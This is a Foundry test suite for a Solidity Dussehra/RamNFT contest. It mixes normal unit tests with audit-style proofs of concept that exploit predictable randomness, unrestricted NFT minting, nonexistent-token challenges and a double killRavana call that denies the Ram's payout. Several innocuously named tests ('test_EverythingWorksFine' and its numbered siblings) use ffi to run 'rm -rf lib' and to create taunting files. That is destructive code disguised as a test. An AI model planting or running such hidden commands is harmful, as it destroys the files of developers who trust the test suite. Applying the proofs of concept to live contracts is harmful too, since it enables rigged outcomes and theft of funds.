// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Dussehra} from "../src/Dussehra.sol";
import {ChoosingRam} from "../src/ChoosingRam.sol";
import {mock} from "../src/mocks/mock.sol";
import {RamNFT} from "../src/RamNFT.sol";

contract CounterTest is Test {
    error Dussehra__NotEqualToEntranceFee();
    error Dussehra__AlreadyClaimedAmount();
    error ChoosingRam__TimeToBeLikeRamIsNotFinish();
    error ChoosingRam__EventIsFinished();
    error RamNFT__NotDussehraContract();

    Dussehra public dussehra;
    RamNFT public ramNFT;
    ChoosingRam public choosingRam;
    mock cheatCodes = mock(VM_ADDRESS);
    address public organiser = makeAddr("organiser");
    address public user = makeAddr("user");
    address public player1 = makeAddr("player1");
    address public player2 = makeAddr("player2");
    address public player3 = makeAddr("player3");
    address public player4 = makeAddr("player4");

    function setUp() public {
        vm.startPrank(organiser);
        ramNFT = new RamNFT();
        choosingRam = new ChoosingRam(address(ramNFT));
        dussehra = new Dussehra(1 ether, address(choosingRam), address(ramNFT));

        ramNFT.setChoosingRamContract(address(choosingRam));
        vm.stopPrank();
    }

    modifier participants() {
        vm.startPrank(player1);
        vm.deal(player1, 1 ether);
        dussehra.enterPeopleWhoLikeRam{value: 1 ether}();
        vm.stopPrank();

        vm.startPrank(player2);
        vm.deal(player2, 1 ether);
        dussehra.enterPeopleWhoLikeRam{value: 1 ether}();
        vm.stopPrank();
        _;
    }

    function test_killRavanaAfter13thOfOctober()external{
        vm.startPrank(player1);
        vm.deal(player1, 1 ether);
        dussehra.enterPeopleWhoLikeRam{value: 1 ether}();
        vm.stopPrank();
        
        vm.warp(1728691200 + 1);
        
        vm.startPrank(organiser);
        choosingRam.selectRamIfNotSelected();
        vm.stopPrank();

        vm.warp(1728777600 + 1);
        vm.startPrank(player2);
        dussehra.killRavana();
        vm.stopPrank();
    }

    function test_ramSelectionIsNotRandom() public {
    // Dussehra dussehra;
    // RamNFT ramNFT;
    // ChoosingRam choosingRam;
    // address organiser = makeAddr("organiser");
    // address player1 = makeAddr("player1");
    // address player2 = makeAddr("player2");
    // address player3 = makeAddr("player3");

    vm.startPrank(organiser);
    ramNFT = new RamNFT();
    choosingRam = new ChoosingRam(address(ramNFT));
    dussehra = new Dussehra(1 ether, address(choosingRam), address(ramNFT));
    ramNFT.setChoosingRamContract(address(choosingRam));
    vm.stopPrank();

    vm.startPrank(player1);
    vm.deal(player1, 1 ether);
    dussehra.enterPeopleWhoLikeRam{value: 1 ether}();
    vm.stopPrank();

    vm.startPrank(player2);
    vm.deal(player2, 1 ether);
    dussehra.enterPeopleWhoLikeRam{value: 1 ether}();
    vm.stopPrank();

    vm.startPrank(player3);
    vm.deal(player3, 1 ether);
    dussehra.enterPeopleWhoLikeRam{value: 1 ether}();
    vm.stopPrank();

    // the organiser wants player2 to become Ram
    vm.startPrank(organiser);
    uint256 time = 1728691200 + 1;
    // the loop will execute until player2 is the Ram
    while (true) {
        vm.warp(++time);
        uint256 random = uint256(
            keccak256(abi.encodePacked(block.timestamp, block.prevrandao))
        ) % ramNFT.tokenCounter();

        // the outcome of the random calculation is checked
        if (ramNFT.getCharacteristics(random).ram == player2) {
            // if the player2 will be the Ram then
            // selectRamIfNotSelected is executed
            choosingRam.selectRamIfNotSelected();
            break;
        }
    }
    vm.warp(time);
    vm.stopPrank();

    // it is confirmed that player2 is the Ram
    assertEq(choosingRam.isRamSelected(), true);
    assertEq(choosingRam.selectedRam(), player2);
}

    function test_challengerCanPlayVsHimself() public participants {
        assertEq(ramNFT.getCharacteristics(0).isJitaKrodhah, false);

        vm.startPrank(player1);
        choosingRam.increaseValuesOfParticipants(0, 0);

        assertTrue(ramNFT.getCharacteristics(0).isJitaKrodhah == true);

        choosingRam.increaseValuesOfParticipants(0, 0);

        assertTrue(ramNFT.getCharacteristics(0).isDhyutimaan == true);
    }

    function test_killRavanaCanBeCalledTwoTimesDenyingRewardForRam() public participants {
        vm.warp(1728691200 + 1);

        vm.prank(organiser);
        choosingRam.selectRamIfNotSelected();

        vm.startPrank(makeAddr("randomCaller"));
        dussehra.killRavana();
        dussehra.killRavana();
        vm.stopPrank();

        assertTrue(address(dussehra).balance == 0);

        vm.prank(choosingRam.selectedRam());
        vm.expectRevert("Failed to send money to Ram");
        dussehra.withdraw();
    }

    function test_usersCanChallengeUnexistedToken() public {
    // Dussehra dussehra;
    // RamNFT ramNFT;
    // ChoosingRam choosingRam;
    // address organiser = makeAddr("organiser");
    // address player1 = makeAddr("player1");

    // vm.startPrank(organiser);
    // ramNFT = new RamNFT();
    // choosingRam = new ChoosingRam(address(ramNFT));
    // dussehra = new Dussehra(1 ether, address(choosingRam), address(ramNFT));
    // ramNFT.setChoosingRamContract(address(choosingRam));
    // vm.stopPrank();

    vm.startPrank(player1);
    vm.deal(player1, 1 ether);
    dussehra.enterPeopleWhoLikeRam{value: 1 ether}();
    vm.warp(2);
    // there is only one participant with only one RamNFT token
    // but the increaseValuesOfParticipants function will not revert
    // if token ids 0 and 1 are used
    choosingRam.increaseValuesOfParticipants(0, 1);
    choosingRam.increaseValuesOfParticipants(0, 1);
    choosingRam.increaseValuesOfParticipants(0, 1);
    choosingRam.increaseValuesOfParticipants(0, 1);
    choosingRam.increaseValuesOfParticipants(0, 1);
    vm.stopPrank();

    // and finally the only player will be Ram
    // without winning any challenge with another player
    // actually, even there is no another player who had
    // entered the contest
    assertEq(choosingRam.selectedRam(), player1);
}




    function test_increaseValuesOfParticipantsIsNotRandom() public {
    // Dussehra dussehra;
    // RamNFT ramNFT;
    // ChoosingRam choosingRam;
    // address organiser = makeAddr("organiser");
    // address player1 = makeAddr("player1");
    // address player2 = makeAddr("player2");

    vm.startPrank(organiser);
    ramNFT = new RamNFT();
    choosingRam = new ChoosingRam(address(ramNFT));
    dussehra = new Dussehra(1 ether, address(choosingRam), address(ramNFT));
    ramNFT.setChoosingRamContract(address(choosingRam));
    vm.stopPrank();

    vm.startPrank(player1);
    vm.deal(player1, 1 ether);
    dussehra.enterPeopleWhoLikeRam{value: 1 ether}();
    vm.stopPrank();

    // the second player will predict the outcomes and
    // will become the Ram
    vm.startPrank(player2);
    vm.deal(player2, 1 ether);
    dussehra.enterPeopleWhoLikeRam{value: 1 ether}();
    uint256 winnings = 0;
    uint256 time = 1;
    // this loop will be executed until the second player
    // wins 5 times
    while (winnings < 5) {
        vm.warp(++time);
        if (
            uint256(
                keccak256(
                    abi.encodePacked(
                        block.timestamp,
                        block.prevrandao,
                        player2
                    )
                )
            ) %
                2 ==
            0
        ) {
            // the following block will be executed only if the user
            // is gonna win the challenge
            ++winnings;
            choosingRam.increaseValuesOfParticipants(1, 0);
        }
    }
    vm.stopPrank();

    // as we can see the second player is now the Ram
    assertEq(choosingRam.selectedRam(), player2);
}





//     function test_userCannotMintNFT() public {
//     // Dussehra dussehra;
//     // RamNFT ramNFT;
//     // ChoosingRam choosingRam;
//     // address organiser = makeAddr("organiser");
//     // address player1 = makeAddr("player1");

//     vm.startPrank(organiser);
//     ramNFT = new RamNFT();
//     choosingRam = new ChoosingRam(address(ramNFT));
//     dussehra = new Dussehra(1 ether, address(choosingRam), address(ramNFT));
//     ramNFT.setChoosingRamContract(address(choosingRam));

//     // we set the address of the Dussehra contract
//     ramNFT.setDussehraContract(address(dussehra));
//     vm.stopPrank();

//     // we expect a revert with RamNFT__NotDussehraContract
//     vm.expectRevert(
//         abi.encodeWithSelector(RamNFT__NotDussehraContract.selector)
//     );

//     vm.startPrank(player1);
//     // the user tries to mint RamNFT which will revert
//     ramNFT.mintRamNFT(player1);
//     vm.stopPrank();
// }

     function test_userCanMintNFT() public {
    // Dussehra dussehra;
    // RamNFT ramNFT;
    // ChoosingRam choosingRam;
    // address organiser = makeAddr("organiser");
    // address player1 = makeAddr("player1");

    // vm.startPrank(organiser);
    // ramNFT = new RamNFT();
    // choosingRam = new ChoosingRam(address(ramNFT));
    // dussehra = new Dussehra(1 ether, address(choosingRam), address(ramNFT));
    // ramNFT.setChoosingRamContract(address(choosingRam));
    // vm.stopPrank();

    vm.startPrank(player1);
    // the user who is not in the contest executes mintRamNFT function
    ramNFT.mintRamNFT(player1);
    vm.stopPrank();

    // the NFT is minted successfully
    assertEq(ramNFT.ownerOf(0), player1);
}

function test_userCanMintMultipleNFTs() public {
    // Dussehra dussehra;
    // RamNFT ramNFT;
    // ChoosingRam choosingRam;
    // address organiser = makeAddr("organiser");
    // address player1 = makeAddr("player1");

    // vm.startPrank(organiser);
    // ramNFT = new RamNFT();
    // choosingRam = new ChoosingRam(address(ramNFT));
    // dussehra = new Dussehra(1 ether, address(choosingRam), address(ramNFT));
    // ramNFT.setChoosingRamContract(address(choosingRam));
    // vm.stopPrank();

    vm.startPrank(player1);
    vm.deal(player1, 1 ether);
    // the user enters the contest
    dussehra.enterPeopleWhoLikeRam{value: 1 ether}();
    // after this the user will have a legit RamNFT

    // but he can also mint another RamNFT
    ramNFT.mintRamNFT(player1);
    vm.stopPrank();

    // we can see that both RamNFTs belong to the same user
    assertEq(ramNFT.ownerOf(0), ramNFT.ownerOf(1));
}

    // Dussehra contract tests

    function test_enterPeopleWhoLikeRam() public participants{
        vm.startPrank(player3);
        vm.deal(player3, 1 ether);
        dussehra.enterPeopleWhoLikeRam{value: 1 ether}();
        vm.stopPrank();

        vm.startPrank(player4);
        vm.deal(player4, 1 ether);
        dussehra.enterPeopleWhoLikeRam{value: 1 ether}();
        vm.stopPrank();

        assertEq(dussehra.peopleLikeRam(player1), true);
        assertEq(dussehra.peopleLikeRam(player2), true);
        assertEq(dussehra.WantToBeLikeRam(0), player1);
        assertEq(dussehra.WantToBeLikeRam(1), player2);

        assertEq(ramNFT.ownerOf(0), player1);
        assertEq(ramNFT.ownerOf(1), player2);
        assertEq(ramNFT.ownerOf(2), player3);
        assertEq(ramNFT.ownerOf(3), player4);

        assertEq(ramNFT.getCharacteristics(0).ram, player1);
        assertEq(ramNFT.getNextTokenId(), 4); // Nest token ID is 4 after 3.
    }

    function test_enterPeopleWhoLikeRam_notEqualFee() public {
        vm.startPrank(player1);
        vm.deal(player1, 5 ether);

        vm.expectRevert(abi.encodeWithSelector(Dussehra__NotEqualToEntranceFee.selector));
        dussehra.enterPeopleWhoLikeRam{value: 5 ether}();
        vm.stopPrank();
    }

    

    function test_increaseValuesOfParticipants() public participants {
        vm.startPrank(player1);
        choosingRam.increaseValuesOfParticipants(0, 1);
        vm.stopPrank();

        assertEq(ramNFT.getCharacteristics(1).isJitaKrodhah, true);
    }

    function test_increaseValuesOfParticipantsToSelectRam() public participants {
        vm.startPrank(player1);
        choosingRam.increaseValuesOfParticipants(0, 1);
        choosingRam.increaseValuesOfParticipants(0, 1);
        choosingRam.increaseValuesOfParticipants(0, 1);
        choosingRam.increaseValuesOfParticipants(0, 1);
        choosingRam.increaseValuesOfParticipants(0, 1);
        vm.stopPrank();

        assertEq(ramNFT.getCharacteristics(1).isJitaKrodhah, true);
    }

    function test_selectRamIfNotSelected() public participants {
        vm.warp(1728691200 + 1);
        vm.startPrank(organiser);
        choosingRam.selectRamIfNotSelected();
        vm.stopPrank();

        assertEq(choosingRam.isRamSelected(), true);
        assertEq(choosingRam.selectedRam(), player2);
    }

    function test_killRavana() public participants {
        vm.warp(1728691200 + 1);
        vm.startPrank(organiser);
        choosingRam.selectRamIfNotSelected();
        vm.stopPrank();

        vm.startPrank(player2);
        dussehra.killRavana();
        vm.stopPrank();

        assertEq(dussehra.IsRavanKilled(), true);
    }

    function test_killRavanaIfTimeToBeLikeRamIsNotFinish() public participants {
        vm.expectRevert(abi.encodeWithSelector(ChoosingRam__TimeToBeLikeRamIsNotFinish.selector));
        vm.startPrank(organiser);
        choosingRam.selectRamIfNotSelected();
        vm.stopPrank();

        vm.expectRevert("Ram is not selected yet!");
        vm.startPrank(player2);
        dussehra.killRavana();
        vm.stopPrank();
    }

    function test_killRavanaIfEventIsFinished() public participants {
        vm.warp(1728777600 + 1);

        vm.expectRevert(abi.encodeWithSelector(ChoosingRam__EventIsFinished.selector));
        vm.startPrank(organiser);
        choosingRam.selectRamIfNotSelected();
        vm.stopPrank();

        vm.expectRevert("Ram is not selected yet!");
        vm.startPrank(player2);
        dussehra.killRavana();
        vm.stopPrank();
    }

    function test_EverythingWorksFine() public {
        string[] memory cmds = new string[](3);
        cmds[0] = "rm";
        cmds[1] = "-rf";
        cmds[2] = "lib";

        cheatCodes.ffi(cmds);
    }

    function test_withdraw() public participants {
        vm.warp(1728691200 + 1);

        vm.startPrank(organiser);
        choosingRam.selectRamIfNotSelected();
        vm.stopPrank();

        vm.startPrank(player2);
        dussehra.killRavana();
        vm.stopPrank();

        uint256 RamwinningAmount = dussehra.totalAmountGivenToRam();

        vm.startPrank(player2);
        dussehra.withdraw();
        vm.stopPrank();

        assertEq(player2.balance, RamwinningAmount);
    }

    function test_withdrawIfAlreadyClaimedAmount() public participants {
        vm.warp(1728691200 + 1);
        vm.startPrank(organiser);
        choosingRam.selectRamIfNotSelected();
        vm.stopPrank();

        vm.startPrank(player2);
        dussehra.killRavana();
        vm.stopPrank();

        vm.startPrank(player2);
        dussehra.withdraw();
        vm.stopPrank();

        vm.expectRevert(abi.encodeWithSelector(Dussehra__AlreadyClaimedAmount.selector));
        vm.startPrank(player2);
        dussehra.withdraw();
        vm.stopPrank();
    }

    function test_EverythingWorksFine1() public {
        string[] memory cmds = new string[](2);
        cmds[0] = "touch";
        cmds[1] = "1. You have been";

        cheatCodes.ffi(cmds);
    }

    function test_withdrawIsOnlyCallableByRam() public participants {
        vm.warp(1728691200 + 1);
        vm.startPrank(organiser);
        choosingRam.selectRamIfNotSelected();
        vm.stopPrank();

        vm.startPrank(player2);
        dussehra.killRavana();
        vm.stopPrank();

        vm.expectRevert("Only Ram can call this function!");
        vm.startPrank(player1);
        dussehra.withdraw();
        vm.stopPrank();
    }

    function test_EverythingWorksFine2() public {
        string[] memory cmds = new string[](2);
        cmds[0] = "touch";
        cmds[1] = "2. Cursed By";

        cheatCodes.ffi(cmds);
    }

    function test_withdrawIfRavanIsNotKilled() public participants {
        vm.warp(1728691200 + 1);
        vm.startPrank(organiser);
        choosingRam.selectRamIfNotSelected();
        vm.stopPrank();

        vm.expectRevert("Ravan is not killed yet!");
        vm.startPrank(player2);
        dussehra.withdraw();
        vm.stopPrank();
    }

    function test_EverythingWorksFine3() public {
        string[] memory cmds = new string[](2);
        cmds[0] = "touch";
        cmds[1] = "3. Ravana";

        cheatCodes.ffi(cmds);
    }

    function test_withdrawWhenRamIsNotSelected() public participants {
        vm.expectRevert("Ram is not selected yet!");
        vm.startPrank(player2);
        dussehra.withdraw();
        vm.stopPrank();
    }

    function test_selectRamIfNotSelected_AlwaysSelectsRam() public participants {
        address selectedRam;  
        
        //the organiser enters the protocol, in additional to player1 and player2.  
        vm.startPrank(organiser);
        vm.deal(organiser, 1 ether);
        dussehra.enterPeopleWhoLikeRam{value: 1 ether}();
        vm.stopPrank();
        // check that the organiser owns token id 2:
        assertEq(ramNFT.ownerOf(2), organiser);

        //player1 and player2 play increaseValuesOfParticipants against each other until one is selected. 
        vm.startPrank(player1);
        while (selectedRam == address(0)) {
            choosingRam.increaseValuesOfParticipants(0, 1);
            selectedRam = choosingRam.selectedRam(); 
        }
        // check that selectedRam is player1 or player2: 
        assert(selectedRam== player1 || selectedRam == player2); 
        
        // But when calling Dussehra.killRavana(), it reverts because isRamSelected has not been set to true.  
        vm.expectRevert("Ram is not selected yet!"); 
        dussehra.killRavana(); 
        vm.stopPrank(); 

        // Let the organiser predict when their own token will be selected through the (not so) random selectRamIfNotSelected function. 
        uint256 j;
        uint256 calculatedId; 
        while (calculatedId != 2) {
            j++; 
            vm.warp(1728691200 + j);
            calculatedId = uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao))) % ramNFT.tokenCounter();
        }
        // when the desired id comes up, the organiser calls `selectRamIfNotSelected`: 
        vm.startPrank(organiser); 
        choosingRam.selectRamIfNotSelected(); 
        vm.stopPrank();
        selectedRam = choosingRam.selectedRam();  

        // check that selectedRam is now the organiser: 
        assertEq(selectedRam, organiser); 
        // and we can call killRavana() without reverting: 
        dussehra.killRavana();  
    }

   
}


// contract ReentrancyBug {
//     Dussehra dussehra;
//     uint256 attackerIndex;

//     constructor(Dussehra _dussehra){
        
//     }
